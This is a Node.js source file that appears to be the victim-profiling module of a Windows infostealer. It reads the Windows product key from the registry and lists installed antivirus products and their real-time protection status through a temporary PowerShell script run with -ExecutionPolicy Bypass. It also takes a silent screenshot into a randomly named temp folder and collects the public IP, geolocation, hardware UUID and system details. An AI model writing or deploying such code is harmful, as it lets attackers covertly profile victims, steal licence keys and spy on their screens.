const child_process = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

const hardware = require('./../hardware/hardware.js');
const program = require('./../program/program.js');

const randString = (length) => {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
};

const getPCDisk = async () => {
    try {
        const output = await program.execCommand('wmic logicaldisk get size');
        const [size] = output.split(/\s+/).filter(item => item && item.toLowerCase() !== 'size');
        return size ? (Math.floor(parseInt(size) / (1024 * 1024 * 1024))).toString() : '1000';
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getTotalMemory = async () => {
    try {
        const output = await program.execCommand('wmic computersystem get totalphysicalmemory | more +1');
        return Math.floor(parseInt(output) / (1024 * 1024 * 1024)) || '0';
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getCleanUUID = async () => {
    try {
        const output = await program.execCommand('wmic csproduct get uuid');
        const match = output.match(/UUID\s+([A-Fa-f0-9-]+)/);
        return match ? match[1] : '';
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getCpuCount = async () => {
    try {
        const output = await program.execCommand('echo %NUMBER_OF_PROCESSORS%');
        return parseInt(output) || '4';
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getNetwork = async () => {
    try {
        const ip = await program.execCommand('curl -s http://ip-api.com/json');
        return JSON.parse(ip) || {};
    } catch (error) {
        console.error(error);
        return {};
    }
};

const getScreenShots = async () => {
    const dir = path.join(os.tmpdir(), randString(10));
    fs.mkdirSync(dir, { recursive: true });

    try {
        const screenshotPath = path.join(dir, 'screenshot.png');
        child_process.execSync(`powershell.exe -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size); $bitmap.Save('${screenshotPath}'); $graphics.Dispose(); $bitmap.Dispose();"`, { cwd: dir });
        return screenshotPath;
    } catch (error) {
        console.error(error);
        return null;
    }
};

const getDisksInfo = async () => {
    try {
        const rootPath = 'C:';
        const { available, total, free } = await hardware.checkDiskUsage(rootPath);
        const freeGB = (free / (1024 ** 3)).toFixed(2) + 'GB';
        const totalGB = (total / (1024 ** 3)).toFixed(2) + 'GB';
        const usedPercent = ((1 - (available / total)) * 100).toFixed(2) + '%';
        const column = 12;
        const header = [
            'Drive'.padEnd(column),
            'Free'.padEnd(column),
            'Total'.padEnd(column),
            'Use'.padEnd(column)
        ].join('');
        return [header, `${rootPath.padEnd(column)}${freeGB.padEnd(column)}${totalGB.padEnd(column)}${usedPercent.padEnd(column)}`].join('\n');
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getWindowsVersion = async () => {
    try {
        return await program.execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getWindowsProductKey = async () => {
    try {
        return await program.execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getCPU = async () => {
    try {
        return await program.execCommand('wmic cpu get name | more +1')
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getGPU = async () => {
    try {
        return program.execCommand('wmic PATH Win32_VideoController get name | more +1')
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getLocalIP = async () => {
    try {
        return program.execPowerShell('(Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress')
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getOS = async () => {
    try {
        return program.execCommand('wmic OS get caption, osarchitecture | more +1')
    } catch (error) {
        console.error(error);
        return 'Not Found';
    }
};

const getAntivirus = async () => {
    const powershellScript = `
        function Get-AntiVirusInfo {
            [CmdletBinding()]
            param (
            [parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
            [Alias('name')]
            $targetComputer=$env:computername
            )

            $antiVirusDetails = Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ComputerName $targetComputer

            $result = @()
            foreach ($antiVirusProduct in $antiVirusDetails) {
                switch ($antiVirusProduct.productState) {
                    "262144" { $definitionStatus = "Up to date"; $realTimeStatus = "Disabled" }
                    "262160" { $definitionStatus = "Out of date"; $realTimeStatus = "Disabled" }
                    "266240" { $definitionStatus = "Up to date"; $realTimeStatus = "Enabled" }
                    "266256" { $definitionStatus = "Out of date"; $realTimeStatus = "Enabled" }
                    "393216" { $definitionStatus = "Up to date"; $realTimeStatus = "Disabled" }
                    "393232" { $definitionStatus = "Out of date"; $realTimeStatus = "Disabled" }
                    "393488" { $definitionStatus = "Out of date"; $realTimeStatus = "Disabled" }
                    "397312" { $definitionStatus = "Up to date"; $realTimeStatus = "Enabled" }
                    "397328" { $definitionStatus = "Out of date"; $realTimeStatus = "Enabled" }
                    "397584" { $definitionStatus = "Out of date"; $realTimeStatus = "Enabled" }
                    default   { $definitionStatus = "Unknown"; $realTimeStatus = "Unknown" }
                }
                
                $antiVirusInfo = @{
                    ComputerName               = $targetComputer
                    ProductName                = $antiVirusProduct.displayName
                    ProductGUID                = $antiVirusProduct.instanceGuid
                    ProductExecutable          = $antiVirusProduct.pathToSignedProductExe
                    ReportingExecutable        = $antiVirusProduct.pathToSignedReportingExe
                    DefinitionStatus           = $definitionStatus
                    RealTimeProtectionStatus   = $realTimeStatus
                }

                $result += New-Object -TypeName PSObject -Property $antiVirusInfo
            }
            
            return $result
        }
        Get-AntiVirusInfo
    `;

    const tempFile = path.join(os.tmpdir(), `${randString(10)}.ps1`);
    fs.writeFileSync(tempFile, powershellScript);
    
    try {
        const data = child_process.execSync(`powershell.exe -ExecutionPolicy Bypass -File "${tempFile}"`, { encoding: 'utf8' });
        return ((data) => {
            const antivirusInfo = {};
            const lines = data.split('\r\n').filter(line => line.trim() !== '');
            lines.forEach(line => {
                const [key, value] = line.split(':').map(item => item.trim());
                if (key && value) {
                    antivirusInfo[key] = value;
                }
            });
            return antivirusInfo;
        })(data);
    } catch (error) {
        console.error(error);
        return 'Not Found';
    } finally {
        fs.unlinkSync(tempFile);
    }
};

module.exports = async () => {
    try {
        return {
            WINDOWS_VERSION: await getWindowsVersion(),
            ANTIVIRUS_INFO: await getAntivirus(),
            WINDOWS_KEY: await getWindowsProductKey(),
            SCREENSHOTS: await getScreenShots(),
            DISKS_INFO: await getDisksInfo(),
            CPU_COUNT: await getCpuCount(),
            NETWORK: await getNetwork(),
            UUID: await getCleanUUID(),
            DISK: await getPCDisk(),
            CPU: await getCPU(),
            GPU: await getGPU(),
            RAM: await getTotalMemory(),
            IP: await getLocalIP(),
            OS: await getOS(),
        };
    } catch (error) {
        console.error(error);
    }
};